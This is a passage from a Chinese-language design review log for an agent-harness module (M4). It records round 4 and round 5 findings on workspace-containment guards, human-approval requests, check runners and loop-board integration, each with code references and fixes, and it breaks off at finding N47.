问题：`d-agent-examples`（人 2026-10-30 批准，06:41Z；`design-context.md`「Worked examples for the agent」）：主 Agent 写给人或交给 harness 的每一种东西，在写它的那个工具的说明里配一道示范，示范过与真实输入同样的检查（L2 钉住，规则改了示范跟着失败），用与练习题无关的领域（记账小工具），只讲已经定了的事。`request_exception` 的三句话（目的、可逆性与影响面、替代）由 agent 写、原样放进给人看的「附」，正是这一类。0.4 的工具描述与拒绝文案只有占位的字段模板（`"<why, one short sentence>"`），没有示范；§1.5 的自查表里没有这一条（这条决定在 0.4 写完前 4 分钟批准，作者读的 `design-context.md` 还没有这一节）。节点正文的归属只列了 M3、两块板与 M7，但定法是「每种」，M4 的这个工具不在例外里。

改法：

1. §5.3 的工具描述末尾加一道示范，例：`Example: request_exception {"ref": "r-3k9d2m7q", "purpose": "把本月收支合计追加到记账软件读的账本文件", "reversibility": "旧文件先备份，改坏了能找回；不碰别的文件", "alternatives": "写在工作区里，但记账软件只读它自己的目录"}`（三句各在 80、60、60 的上限内；领域是记账小工具，与练习题无关）。
2. L2：把这道示范交给 §5.3 第 2 条的参数检查与 `renderPlan`（编号换成一次真实拒绝的编号），都通过；参数上限或四行规则改了，这一例跟着失败。
3. §1.5 加一行 `d-agent-examples`，另补本轮之前批准、0.4 没有列的 `d-memory-scope` 与 `d-script-timeout`（N36、N37）。

挡路依据：违背人定的方向（`d-design-onepage`：对照方向清单，违反就挡）。

#### N35 NIT 「每一回合再出示」的条件，验收与 §5.5 不一致

位置：§1.2 `m4-request-card` 第 3 条末句（:54）；§5.5 第 2 条；§14.2 F14 一条。验收写「申报开着、这一回合第一步没有人的消息、上一回合不是以这段文字结束时，每一回合都提醒」；§5.5 第 2 条与 L2「连着三个回合各有一条」没有第三个条件。§5.5 是对的：上一回合以申报文字结束、这一回合被提醒叫醒，这一回合的助手消息照样排在申报文字之后，回合末还得再出示一次。改法：验收第 3 条去掉「上一回合不是以这段文字结束时」。

#### N36 NIT 跨项目的经验与关于人的记忆已经定了

位置：§0 存放一条、§1.1 末条、§1.5 存放一行、§2.4 末段（:221）、§15、§17「留着的一点」（:1564）；`graph-ops-v04.json` 给 `m4` 的批注。`d-memory-scope`（人「全都没问题」，节点已批准）：关于人本人的记忆留在用户级，项目经验（含通用的踩坑经验）都在项目里；用户级恰好留六样。0.4 各处仍写「还在问人」。M4 不存经验与记忆，结论不变。改法：各处改为引 `d-memory-scope`，删去 §17「留着的一点」；批注里那半句同改。

#### N37 NIT 检查的超时没有对照 `d-script-timeout`

位置：§6.3「检查不是拦路的事件……超时、崩溃与跑不起来都写成「没跑成」」（:1041）、§6.5「连续失败 3 次后本会话不再跑」（:1081）、§6.8 `ownRules` 第 3 行、§1.5。`d-script-timeout`（人「没问题」，已定）：不拦路的条目各有自己的超时，超时的结果写「没跑完」交给主 Agent，下一次触发照常再跑，超时计进周报，反复超时的条目提议修。0.4 的结果交给改文件的那个 agent（`d-boards-as-hooks` 允许「条目指定的 agent」，可以成立），但同一项检查连续失败 3 次之后本会话不再跑，与「下一次触发照常再跑」不同，主 Agent 在 worker 改文件时也不知道。改法：§6.3 引 `d-script-timeout` 并写明三点：结果给改文件的 agent 的理由；`recordRun` 对超时记 `failed`、`reason: 'timeout'`，周报的超时计数与「反复超时提议修」由此得到数据；「连续 3 次不再跑」只用于跑不起来与输出读不懂，超时照决定下一次照常再跑（或写明为什么超时也要停、并在 §1.5 记为与这条决定的差别）。

#### N38 NIT 申报停住推进之后，没有一步就不会过期，推进也不会恢复

位置：§5.5 第 1 条（过期在「下一步或会话卸载时」比较）、§5.9 自动推进的停等第 1 条（M7 在每一步判恢复）、§5.8 末条（面板到 2 小时自己去掉）、§11「回话：人一直不回」一行（:1244）。goal 停住之后主 Agent 只在被别的事叫醒时才走步。人一直不回时，申报不过期、`openRequests` 仍列着它，M7 不恢复；2 小时后面板把它从「需要你」去掉，推进却还停着，直到夜间巡检或晨报叫醒主 Agent。改法：guard 行在登记申报时设一个 `unref` 的定时器，到 `askedAt + 2 小时` 时写 `expired`、经 `agent.followup` 送一条 `hourness-request` 关闭提醒（叫醒持有者，M7 在那一步恢复）；`openRequests` 不返回已过 2 小时的申报。§11 那一行照改。

#### N39 NIT 回放读哪些会话没有按项目限定

位置：§3.6「日志」与「历史结果」两条（:546）、§3.9 `replay` 一行（:601）、§2.4。设计期的试算读的是全机 719 个日志；`replay` 的默认读哪个目录没写。按 `d-rules-in-repo`，结果写进一个项目的 `.llm/`，「当时拦没拦」也只对这个项目的流水；别的项目的会话放进来，命令文本落在不属于它的项目里，`historical` 也都对不上（多记 `unknown`）。改法：默认只读会话头 `cwd` 经 `projectRoot` 归到目标项目的会话，`--sessions` 可另给目录；`summary.json` 记因属于别的项目而跳过的会话数。

#### N40 NIT 改动文件的路径相对主检出，worker 工作树里的改动对不上目录前缀

位置：§6.1 事件表「字段 `files`（……改动文件相对项目根的路径……）」、§6.2「换成相对项目根的路径」（:1033）、§2.4 的项目根定义。§2.4 把工作树归到主检出，所以 worker 改的 `<仓库>/.worktrees/t/src/a.ts` 在事件里是 `.worktrees/t/src/a.ts`，筛选 `src/` 对不上，检查不跑也没有提醒（扩展名筛选不受影响）。装了 M7 时改文件的几乎都是 worker。§6.3 跑检查用的 `cwd` 已经是「改动文件所在的仓库根（工作树也算）」。改法：`files` 写成相对改动文件所在仓库根（工作树按它自己的根）的路径，与 §6.3 的 `cwd` 同一个根；L2 一例：工作树里改 `src/a.ts`，筛选 `src/` 的条目跑。

#### N41 NIT worker 的 `ask_main` 怎样结算，§3.3 前后说法不一

位置：§3.3「有几种拒绝的正路就是停下」一段（:482）。同一句里写 worker 的 `ask_main`「记 `other`，正路由 M7 的 `rightPath` 认」，又把它列进「做对了的情形结算成 `none`」。worker 被拒之后的下一次调用就是 `ask_main`，不是没有下一步；被记下的拒绝是 `worker-scope` 的，结算用的是它的 `rightPath`。改法：这一句改为「M7 的 worker 用 `ask_main` 等主 Agent：`worker-scope` 的 `rightPath` 认带编号的 `ask_main` 时记 `right-path`，M7 没加之前记 `other`」，并把它从 `none` 的例子里拿出来。

#### N42 NIT 一处行号

位置：§4.6「引擎 `TRANSITIONS` 里 `done` 只能到 `doing`，`src/graph/engine.ts`:106–113」（:678）。实读 `TRANSITIONS` 在 :110–117（`done: ['doing']` 在 :114），:104–107 是 `OPEN_PARENT_TYPES` 与 `SUPERSEDABLE`。改法：改为 :110–117。

### 已核实的假设（本轮新增）

- 引擎对没改任何字段的 `edit` 返回 `invalid`（`src/graph/engine.ts`:606–613，`set changes nothing`）：第三次修复要 M3 新加一种不带四行的 `propose_to_human`，循环板 0.4 §5.2 第 12 项的「引擎接受字段不变的 `edit`」不成立。M3 附录 0.4 §3.4 的 `propose_to_human` 今天要题目与四行（输入表 `title` 必填），`question` 一种是改四行，所以这是一条要 M3 改的请求，已写进 §18 与 `graph-ops-v04.json`。
- `record_human_answer` 的 `question` 一种以这张待决最后一条 `propose`、`edit` 或 `decide` 的时刻为起点，不要求本会话出示过（M3 附录 0.4 §3.5 第 4 条），所以 harness 先提、主 Agent 之后原样出示的做法记得下人的回话。
- `createUserNotice(kind, …)` 写出 `source {…facts, kind, form: 'notice', summary}`（`src/shared/dsh-min.ts`:462–468）：`hourness-request` 的事实字段原样进会话日志；M7 与循环板的提醒的 `kind` 不是 `user`，§5.5 第 2 条不会把它们记成 `not-client`。
- 圈禁根：`rootsFor` 取行配置的 `workspaceRoots`，否则取调用方 agent 会话头的 `cwd`（`src/guard/index.ts`:90–95）；M7 0.4 §3.1.2 第 8 步起 worker 时 `cwd` 为工作树绝对路径、`parent` 为主 Agent。前者是 F19 的依据，后者支持 §5.9 第 4 条「worker 的派发链的根是主 Agent」（仍按设计的标法由 L3 核对）。
- M7 0.4：`worker-scope` 以 `prepend` 注册、仍用 `evaluate`（§3.2 引言）；纠偏的正路是 `ask_main` 请主 Agent 放宽写入范围（§3.2.1 末段）；`await_human` 收提议式的人定待决并以 `hourness-waiting-human` 停住，恢复在每一步由执行行的监听器判（§3.9.5 前两条）；`ask_main` 至多等 20 分钟（`ASK_WAIT_MS`）、`answer_worker {request, text}`（§3.4.2 表）。§5.9 引的都对得上。
- 循环板 0.4：`Contribution`、`ownRules`（6 行 × 80 码点）、`details`（20 行 × 160 码点）、`listedOnly`、`recordRun` 只认 `self`、`AttachDetail` 只给 `run`、`acceptProposal` 的记号只对 `run`（§2.1、§2.3、§3.1、§3.2、§7.1）。前三样与 M4 §6.8 一致，后三样是 F17 的依据。
- plain-ui 0.7：「需要你」的 (b) 一类是 `graphLive.awaiting`，今天只收 `confirm`、`release`、`unknown`（§4.3 第 6 条 :98、§4.9 :735）；写法检查的第二阶段对 `llm`、`harness` 写入的待决 `title` 查 `code`、`id`、`identifier`、`term`、`jargon` 并拒绝（§5.3 :473–495），进行中的任务标题不查 `jargon`（:493）。后两条是 F18 的依据。
- §1.2「建议验收」一列 32 条、4,546 个码点；§4.6 与 §5.4 的四行长度与加粗按 `proposalLineRefusal` 复数无误。
- 依据：`820eb78..fd7ac1f` 在 `src/`、`tests/`、`scripts/`、`packages/` 没有改动；`src/guard/rules.ts`:51–56、`src/toolsearch/index.ts`:155–176、`src/graph/index.ts`:79、`src/memory/audit.ts`:42–48 与设计的引述一致。
- `d-boards-as-hooks`、`d-rules-in-repo`、`d-main-agent-peak-exempt`、两层循环：§2.4 每样东西的存放都在项目里，M4 没有用户级文件；M4 不读高峰档位、不让主 Agent 等高峰（§2.5）；§13.5 写了三档在 M4 里的例子与产品里两种问话的批法，申报与别的件用 `busy` 分开。四条的落法本轮没有发现问题（存放的一处细节见 N39，检查条目的落法见 F17）。

### 没有核实或说法有误的假设（本轮）

- 有误：§5.9 第 2 条与服务注释假定 worker 的「工作区」大于它的工作树（「目标在工作区内、只是出了工作树」）；默认配置下 worker 的圈禁根就是工作树，见 F19。
- 有误：§5.4 说 `renderPlan`「只吃 harness 自己代码里的字串」；背景一行的焦点标题与题目里的路径都是外来数据，见 F18。
- 有误：§11「检查命令执行任意命令」的防线引循环板 0.4 §7.1 第 3 步核对命令原文；那一步只对 `run` 动作有 `detail`，M4 的请求里没有让它也对 `check` 与脚本成立，见 F17。
- 不一致：循环板 0.5 草稿（:564、:745、:1495、:1652）以为检查的命令来自 env 工具节点、`listedOnly` 只配 `self`、「循环板这边不用改」，M4 0.4 要循环板改五处，两边各以为对方不用改，见 F17。
- 过时：`d-memory-scope`、`d-script-timeout`、`d-agent-examples` 都在 0.4 写完之前批准，设计里没有或仍写「在问人」，见 F20、N36、N37。
- 没有核实：goal 为 `blocked` 时 `dsh-goal-round-driver` 不排下一轮（H22，设计标了推断，L3 `guard-request-goal` 核对）；各行导入同一个 `dist/guard/followup.js` 实例（L3 `guard-followup`）；`env-checks` 探针的最小循环板服务能否代表真的循环板（设计把真机的整条路放在 L4 第 5、8 项）；规则板 0.9 与循环板 0.5 都还在写，本轮只读了 M4 用到的几处。

### 结论

CHANGES_REQUESTED：挡路 4 条（F17–F20，都是 MEDIUM），非阻断 8 条（N35–N42）。第 3 轮的 14 条里 13 条关闭，N33 部分关闭（设计里的部分已改，放行稿里的部分等 `onepage.md` 重写）；六条挡路的改法都落实了。各轮挡路条数 8、2、6、4。新挡路的来源：F17 是 F11 的改法往前多走了一步（检查改成人加的板上条目）之后，循环板要改的地方里漏了「给人看原文」这一条，循环板 0.5 草稿又走了相反的路，接缝没有人定；F18 在 0.3 就有（申报文字的焦点标题与第三次修复的题目都嵌了外来的标题），前几轮评审没有查出，0.4 的四行改用 M3 的规则之后照旧；F19 是 F13 的改法里 `outsideDenial` 的边界与实际的圈禁根不一致；F20 是 0.4 写完前 4 分钟批准的 `d-agent-examples` 没有接上。这是人准的最后一稿，按简报停下，把这四条报给人；`onepage.md` 不重写。

## 第 5 轮（design.md 0.5）

这是人在 2026-10-30 回「行」之后给的再一稿，并进对齐轮（`d-alignment-rounds`）：本轮由独立评审员（不是写稿的一方）评审；仍有挡路就停下问人，没有挡路则放行并重写 `onepage.md`。上一轮（0.4）的 4 条挡路 F17–F20 与 8 条非阻断 N35–N42 是本轮要核对的对象，对齐轮简报（`align-rounds-2026-10-30/brief.md`）的规则 1、2、3、6、7、8 与规则板 0.10 记在 `m4` 节点上的三件请求也在核对范围内。

核对范围：0.5 全文（§0–§19.4，1,800 余行）、`design-0.4.md` 的存在与版本行、`graph-ops-align.json`（合法的 JSON 数组，七条中文批注，节点 id 为 `m4`、`schedules`、`m3`、`m7`、`rules`、`m8-plain-language`、`metrics`）；main 的 HEAD 是 `97d04ca`，设计依据 `9c346fb` 之后 `src/`、`tests/`、`scripts/`、`packages/` 没有改动（`git diff --stat 9c346fb HEAD -- src tests scripts packages` 为空）。读过的源码：`src/data/project-root.ts` 全文、`src/guard/index.ts`:70–130、`src/guard/rules.ts`:50–58、`src/graph/engine.ts`:104–118 与 :604–616、`src/graph/proposal.ts`、`src/graph/plain-question.ts`、`src/graph/service.ts`、`src/graph/store.ts` 的导出、`src/memory/audit.ts`:25–110、`src/shared/dsh-min.ts` 的 `AgentLike` 与 `createUserNotice`、`src/toolsearch/index.ts`:153–158，另核对 `node_modules/eslint`（10.13.0 带 `--pass-on-unpruned-suppressions`，`options.js`:322）与 `node_modules/eslint/bin/eslint.js`、`node_modules/typescript/bin/tsc` 都在。读过的设计：循环板 0.6（`schedules/design.md` §2.3、§3.1、§4.4、§5.3、§6.6、§17 M4 与 M3 两节）；规则板 0.10（§10.1、§10.7 M4 一节第 1–4 条）；M3 附录 0.5（§3.3、§3.4、§3.5、§9 第 18 条、§10）；M7 0.6（`EXECUTE_RULES`、§12.1、§18.2、R4-F10 一行）；plain-ui 0.7 §5.3；`docs/CHARTER.md` 0.7（§3.2 第 3 条、§6）；`design-context.md` 全文（尤其「Check entries seam」「Worked examples for the agent」「Rules thin slice」）；图节点 `m4`（全部批注）。图上 `m4` 的批注比文档新，以节点为准。

### 第 4 轮发现的状态

| 发现 | 状态 | 核对 |
| --- | --- | --- |
| F17 MEDIUM 人加的检查条目要循环板改五处，漏请「给人看原文」，循环板 0.5 草稿走相反的路 | 关闭 | 检查分两种（§6.1 表）。人加的检查是循环板上人的普通条目，动作 `check`，命令原文取自环境工具节点，由循环板的 `runCommand`（`queue: 'check'`）跑，走与脚本同一条同意的路：`loop_propose` 返回 `commandDetail`，`propose_to_human` 原样给人看，`record_human_answer` 核对到人看过原文才拍板，`acceptProposal` 没有记号就 `invalid`（循环板 0.6 §3.1 `attachable`/`AttachDetail`、§6.6 `commandDetail`、§17 M3 第 5、6、9 条，实读与设计一致）。M4 不执行人加的条目，`src/env/` 里没有读条目的代码和 `node:child_process`（§12 一行、L2 静态检查）。M4 给的三样与循环板 0.6 §17 M4 一节逐项对上：读法 `checkCommandOf`（`EnvService` 成员，读不出返回 `undefined`）、`fillCheckArgv`（`{files}` 每文件一项、`-` 开头的名字加 `./`、带换行的路径跳过、命令行超长时丢文件并计数）、`formatCheckOutput`（读不懂返回 `undefined`）。0.4 §18 第 5 条的 ①②④ 撤回、③ 由 0.6 的 glob 接住、⑤ 由 `queue` 接住，与循环板 0.6 §17 M4 第 4 条逐字一致。M4 自带的检查器是带 `when` 的检查行，在板上是 `self` 的只读一项 `env.checks-after-edit`，进程经 `runCommand({queue: 'direct'})` 起，字段与限额对得上 `CommandRequest`（`project`、`cwd`、`argv`、`timeoutMs`、`maxOutputBytes`、`logFile`，信封可空）。`env.files-edited` 的字段（`files` strings/`paths`、`root` string、`truncated` boolean/`is`）、键 `files-edited:<会话>:<turn>-<step>`、先问 `listens`、`unheard` 都与 0.6 §4.4 一致；`ownRules` 四行和 `details` 的上限在 0.6 §2.1 与 §3.1 之内；`ListedRun` 的 `outcome` 取值对得上。§11 不可逆表「检查命令执行任意命令」一行改写成两道防线并写明自带检查器较弱的一点与加固办法；这与 `Check entries seam` 第二条（「M4 may keep executing them」）一致。§6.1 与 §18 第 5 条第一项都点名了依据的循环板节号，`design-context.md` 要求的「names the loop board sections it relies on」满足。图上有一条请求的落点：`graph-ops-align.json` 的 `schedules` 一条（⑥⑧⑨ 三件小事，等 dogfood 之后） |
| F18 MEDIUM harness 写给人的文字嵌了图上标题与路径，`renderPlan` 会抛错；第三次修复的题目会被面板的写法检查拒掉 | 关闭 | 数据与常量分开（§5.4）：`renderPlan` 的题目分 `lead`（常量）与 `data`（`displayPath` 转义过的路径），只查常量；焦点标题经 `personTitle(title, {limit, issuesOf})`，不合格返回 `undefined`，背景一行省去那半句；第三次修复的题目在 `personTitle` 为 `undefined` 时写「这件活要修第 3 次了」、标题移进 `body` 的「附」（§4.6 表）；`request_exception` 第 7 步对任何抛错返回 `unavailable`、不登记、不写流水、行健康降级（§5.3）；§11 加一行。对照 plain-ui 0.7 §5.3 实读：`plainIssues` 的 `code`（`M\d+`）、`id`、`identifier`、`term`、`jargon`、`length`、`background` 规则；`jargon` 只查待决与提议，进行中的任务标题不查，所以「补齐验收条件」这类焦点标题确实会让整句查换词抛错，F18 的前提成立；§4.6 版面里的示例题目「Windows 上的路径解析」不触发这几条规则。`issuesOf` 在 plain-ui 第二阶段合入后取 `plainIssues(text, 'title', ids)`，之前取 `plainWordsIn`，并写明 plain-ui 未合入时带 `M<数字>` 的 L2 一例跳过。L2 五例（焦点标题「补齐验收条件」、带 `*`、「M4 guard 补齐与环境」、路径含「门禁」与 `gate.ts`、`renderPlan` 被造成抛错）覆盖评审给的四条。路径总长的一处边界见 N44 |
| F19 MEDIUM `outsideDenial` 用 worker 的圈禁根判「工作区外」，写主检出也变成问人 | 关闭 | `outsideDenial` 改按项目判（§5.9 判法一段、服务注释、§10 一行、§12 一行）：目标解析后取最近一个存在的目录 `d`，`projectOf(d)` 与 `projectOf(call.base)` 的 `root` 相同，或目标在这个 `root` 之下，返回 `undefined`；工作目录不在任何项目里时退回按圈禁根判；guard 行自己的圈禁对 worker 不变。实读 `projectOf`（`src/data/project-root.ts`）：工作树经 `.git` 文件的 `gitdir` 与 `commondir` 归到主检出，返回 `{root, git}`，家目录与盘符根返回 `undefined`，所以「主检出与它的工作树是同一个项目」成立，项目外的目标（`projectOf(d)` 为 `undefined` 或别的根）发编号。`rootsFor` 的实际行为（:92–96，没配 `workspaceRoots` 时取会话头 `cwd`）与 F19 的前提一致。验收 `m4-request-card` 第 8 条、L2 三例、`guard-request-worker` 加一步、L4 第 4 项都写了；给 M7 的请求写进 `graph-ops-align.json` 的 `m7` 一条 |
| F20 MEDIUM `request_exception` 没有示范 | 关闭 | §5.3 说明末尾带一道示范，常量 `REQUEST_EXAMPLE`：`{"ref": "r-3k9d2m7q", "purpose": "把今天新添的曲目追加到播放器读的歌单文件", "reversibility": "旧文件先备份，改坏了能找回；不碰别的文件", "alternatives": "试过写在工作区里，但播放器只读它自己的目录"}`。`ref` 合 `^r-[0-9a-z]{8}$`，三句各 20、20、21 个字符左右，在 80、60、60 的上限内；领域是音乐播放器，不是记账（全文 grep「记账、账本、ledger、bookkeep、收支、账单、对账」无命中），简报规则 7 满足；说的是已经定了的事（写工作区外，人回「可以」，同一个调用放行一次），`d-agent-examples` 满足。L2 把它交给第 2 条的参数检查与 `renderPlan`，并核对不含 `tests/calibration/` 各题的领域词（该目录存在）。§1.5 补了 `d-agent-examples`、`d-memory-scope`、`d-script-timeout` 三行；没有检查器时的提醒同时是检查行的示范（Python 的 ruff），L2 让它过 `checkLineRefusal` |
| N35 验收与 §5.5 的「每一回合再出示」条件不一致 | 关闭 | `m4-request-card` 第 3 条去掉「上一回合不是以这段文字结束时」，写「不论上一回合是不是以这段文字结束」，与 §5.5 第 2 条和 L2「连着三个回合各一条」一致 |
| N36 `d-memory-scope` 已定 | 关闭 | 文件头、§0、§1.1、§1.5、§2.4 末段改为引 `d-memory-scope`；§17「留着的一点」已删；全文搜「还在问人、留着不定、正在问人」无命中 |
| N37 检查的超时没有对照 `d-script-timeout` | 关闭 | §6.3 引决定并写三点：结果交给改文件的 agent；超时 `recordRun` 记 `failed` 并写 `timeout`；「连续 3 次后本会话不再跑」只用于跑不起来与输出读不懂，超时下一次改动照常再跑，同一项上一次还在后台跑时不起第二个；§6.5、§6.8 `ownRules` 第二、三行、§11、L2 同改；周报是否数 `self` 条目的超时留给循环板（§18 第 5 条 ⑨，已写进 `schedules` 批注）。`reason` 的写法两处不一致见 N45 |
| N38 申报停住推进之后没有一步就不会过期 | 关闭 | 登记申报时设 `unref` 的 2 小时定时器，到点写 `expired` 并经 `agent.followup` 把 `hourness-request` 关闭提醒送给申报的 agent，`openRequests` 不返回已过 2 小时的申报，定时器丢了仍按下一步比较时刻补写（§5.5 第 1 条、§5.9、§11 一行、L2）。`AgentLike.followup(message: UserNotice)` 在 `src/shared/dsh-min.ts`:362 实有 |
| N39 回放读哪些会话没有按项目限定 | 关闭 | §3.6、§3.9、`m4-shadow` 第 4 条：默认只读会话头 `cwd` 经 `projectOf` 归到目标项目的会话，`--sessions` 同样按这一条筛，`summary.json` 记因属于别的项目而跳过的会话数；设计期试算读全机日志的说明补上；L2 一例 |
| N40 改动文件路径相对主检出，对不上目录前缀 | 关闭 | `files` 相对改动文件所在检出的根，`root` 随载荷给（§6.2、§6.8、`m4-checks` 第 7 条），与 §6.3 的 `cwd` 同一个根；一步改了几个检出里的文件就各发一个事件，第一组用 0.6 的键、其余在 `step` 后加序号；L2 一例。0.6 §4.4 也是这样写 |
| N41 worker 的 `ask_main` 怎样结算 | 关闭 | §3.3 改为被记下的拒绝是 `worker-scope` 的，用它的 `rightPath` 结算，M7 的 `rightPath` 认带编号的 `ask_main` 时记 `right-path`，之前记 `other`；已从 `none` 的例子里拿出；L2 一例；给 M7 的请求在 `m7` 批注里 |
| N42 `TRANSITIONS` 行号 | 关闭 | 实读 `src/graph/engine.ts`:110–117，`done: ['doing']` 在 :114；设计改为 :110–117 |
| N33（上一轮部分关闭）放行稿里的几处说法 | 设计一侧关闭 | 设计里的「重启」写成含插件重新加载，D1 的条数与字数已重数（见下，34 条、5,782 个字符）。`onepage.md` 仍是 0.3 的，按简报评审通过之后才重写，本轮通过，下一步写 |

规则板 0.10 记在 `m4` 节点（2026-10-30T10:13Z）上的三件请求：

| 请求 | 状态 | 核对 |
| --- | --- | --- |
| 一、代码规则目录 `GUARD_RULES` | 已答，附一处措辞差（N47） | §3.8 与 §2.2 表：`src/guard/catalog.ts` 的 `GUARD_RULES` 列 guard 行六条（`workspace-containment`、`file-tools-only` 与四条影子规则）、图行 `graph-files-only`、循环板两条、指标流水一条；`id` 是规则对象自己的，`row` 是装它的行，`mode` 取规则对象的字段，规则板的 `builtin.ts` 只映射、不另写一份；先合入的一方建文件。与规则板 0.10 §10.1 的写法一致（实读 :1738） |
| 二、违规流水的 `record` 与 `late` 由 `classifyRecord` 认 | 已答 | §3.2：`RecordClass` 加 `rule-record`、`late-denial`、`deferral`；`rules:` 开头的 `mode: 'record'` 是只记录（不进违规、单列计数）、`mode: 'late'` 是晚到的拦下（进违规、另列一行）、`mode: 'enforce'` 加 `effect: 'queue'` 是排队（不进违规）；不以 `rules:` 开头的 `record`、`late` 与别的未知取值算读不懂，不算拒绝；晨报两行、`ruleStats`、L2 七例（含读不懂）；`keyOf(record)` 等于 `recordKey(JSON.stringify(record))`，实读 `src/memory/audit.ts`:65 追加的正是 `JSON.stringify(record)`。规则板在 M4 的 `classifyRecord` 合入之前自己数这两种，之后可改用，数字不分叉（§2.3 一行） |
| 三、规则板的门调 `observe` 与 `noteDenial` | 已答 | §3.3：规则板的门第一件事调 `observe(agent, call, callId)`，拦下与开单拒绝时调 `noteDenial(agent, callId, {rule: 'rules:<id>', call, key, origin})`，没有 `rightPath`，晚到的拦下不调；`PendingDenial` 的形状含 `rule`、`call`、`key`、`rightPath?`、`origin`，与规则板 §10.7 第 3 条写的入参逐项对上；`evaluate` 删除（第四项）也已跟上 |

简报规则的核对：

| 规则 | 结论 | 依据 |
| --- | --- | --- |
| 1 只照人的决定改、不另立方向，需要人定的写成一项 | 满足 | 0.5 的改动都对应评审发现、`Check entries seam`、`d-agent-examples`、`d-memory-scope`、`d-script-timeout`、`d-alignment-rounds` 或已放行设计；自带检查器「没有循环板就不跑」沿用 0.4 的取舍（§16 一行，理由是 `d-rules-visible`）；唯一要人定的是 D1 |
| 2 不改已放行的设计，要它们改的写成图上批注留给 dogfood 之后 | 满足 | 设计只改 `.agents/tasks/m4/` 下的文件；`graph-ops-align.json` 给 `schedules`、`m3`、`m7`、`rules`、`m8-plain-language`、`metrics` 各一条：有请求的几条（`schedules`、`m3`、`m7`、`m8-plain-language`）都注明等 dogfood 之后处理（`d-freeze-until-dogfood`），`rules` 一条写明没有新的请求，`metrics` 一条是对已有请求的回答 |
| 3 先留旧稿、文档里记每处改动答哪条发现 | 满足 | `design-0.4.md` 在（版本行 0.4）；§19.4 两张表逐条对应 F17–F20、N35–N42 与对齐轮依据；文件头列出 0.5 改的几处 |
| 6 留给人的事项格式 | 满足 | 只有 D1 一项：题目一段，背景、推荐、疑问、不做四行各自成段、标签不加粗、每行恰一处加粗（背景 8、推荐 9、疑问 9、不做 6 个码点，在 2–12 之内）、各一句、问话在最后、没有选项、不超过三项。数字：题目 20、背景 17、推荐 17、疑问 20 个码点复数无误；不做一行实为 22 个码点（设计写 23，见 N48）。「34 条、约 5,800 字」复数：`m4-shadow` 7 条、`m4-rules` 3、`m4-request-card` 10、`m4-checks` 7、`m4-env` 3、`m4-suppressions` 2、`m4-cleanup` 2，共 34 条，「建议验收」一列 5,782 个字符 |
| 7 示范不得用记账一类领域 | 满足 | 见 F20；§5.4 版面里的「整理今天的笔记」「todo.md」、§6.6 的 Python 加 ruff、§4.6 的「Windows 上的路径解析」也都与练习题无关 |
| 8 文档是干净区 | 满足 | 全文搜语气词与人设用语无命中（`~` 只出现在路径 `~/.dsh` 里）；`graph-ops-align.json` 同；本轮没有看到被截断而丢失的节 |

### 发现

本轮没有 HIGH 与 MEDIUM。下面九条都是 NIT：每一条要么有现成的退路（出错有行健康和降级写法），要么只是数字、引用或措辞不准，不影响验收条件、不可逆损失的防线和失败的可追溯，所以不挡路。

#### N43 NIT 板上的 `details` 是同步函数，设计没说它从哪里取已批准的检查行

位置：§6.8 表里 `details(entry, project)` 一行、`m4-checks` 第 5 条、L4 第 8 项。循环板 0.6 §3.1 把 `Contribution.details` 定为同步、不抛错、至多 20 行每行至多 160 个码点；M4 的图读取是异步的（`src/graph/store.ts` 的 `loadGraph` 是 `async`，图行服务只有 `dirFor` 与 `isGraphTool`），`envBranch(graph)` 是对已读入的图做的纯函数。设计写「读不到时返回空表」，没有写同步的 `details` 读什么，所以照字面实现不出来第 5 条要的「每个已批准的检查行一行」。另外「命令前 60 个码点」比上限 160 小得多，人看板时看到的命令可能在第 60 个码点处被截断。改法：env 行在每次读图（每步的环境提醒、`checkCommandOf`）之后把 `envBranch` 的结果按项目存进内存里的快照，`details` 只格式化快照，第一次读图之前返回空表；每行按 160 个码点的上限放进尽量多的命令原文；L2 加一例：节点的 `rev` 变了、快照随之更新，`details` 的输出随之变。

#### N44 NIT `displayPath` 的「至多 60 个字」，设计写的算法保证不了

位置：§5.4 的 `displayPath` 一段与「路径」一条（「题目整段的上限 80 个码点够用：`lead` 至多 12 个码点，路径至多 60 个字」）。算法是「超过 60 个字时保留盘符或根与最后两段、中间写『…』」，最后两段本身可以超过 60 个字（Windows 的单段文件名可长到 255 个字符），结果超过 60，题目整段超过 80 个码点，`renderPlan` 抛错，`request_exception` 走 §5.3 第 7 步的 `unavailable`：这次申报发不出去，agent 只能在回复里告诉人。有退路、行健康会降级，所以只记 NIT，但 F18 想消除的正是「合法的外来数据让申报发不出去」。改法：保留根与最后两段之后再硬截到 60 个码点（缩短最后一段的中部，写「…」）；L2 加一例：100 个字的文件名仍写得出合格的申报文字。

#### N45 NIT 超时的 `recordRun` 原因，两处写法不同，也没有长度上限

位置：§6.3 与 `m4-checks` 第 5 条写 `reason: 'timeout'`，§6.8 表写 `<检查名>: timeout`，§11 写 `reason: 'timeout'`。循环板 0.6 §3.1 的 `ListedRun.reason` 是「一行，至多 120 个码点」的自由文字，没有单独的超时取值；要让周报能数到 M4 的超时（`d-script-timeout`、循环板 0.6 §6.11 的 `timeoutEntries`，设计在 §18 第 5 条 ⑨ 请循环板定要不要数 `self` 条目），格式必须固定。改法：统一成 `<检查名>: timeout`，截到 120 个码点，并在 ⑨ 里写明建议循环板数 `outcome: 'failed'` 且原因以 `: timeout` 结尾的 `self` 运行；§6.3、§11、`m4-checks` 第 5 条同改。

#### N46 NIT 没有出声的运行不报给循环板，板上的「上次」会停在旧结果

位置：`m4-checks` 第 5 条（「每次把检查结果交给 agent 时，按每个检查报一次运行」）、§6.8 `recordRun` 一行、§6.5「全部为 0 且上一条也全是 0 时不注入」。最常见的结果（没有发现）按 §6.5 不注入，也就不「交给 agent」，于是 `ran`（都没有发现）这个取值只会在「上一条有发现、这次全 0」时出现，板上这一项的「上次」长期停在很早的一次，看起来检查没在跑；`docs/CHARTER.md` §7.1 条款 11（处处留痕）要的是每次运行都有一条。改法：「每跑完一次检查（不论提醒是否出声）按每个检查报一次运行」，被压住的全 0 记 `ran`；L2 加一例：连续三步全 0 的运行，假的循环板服务收到三次 `recordRun`、没有一条提醒。

#### N47 NIT `GUARD_RULES` 的范围，规则板 0.10 自己有两种写法，M4 取其一但没有说破

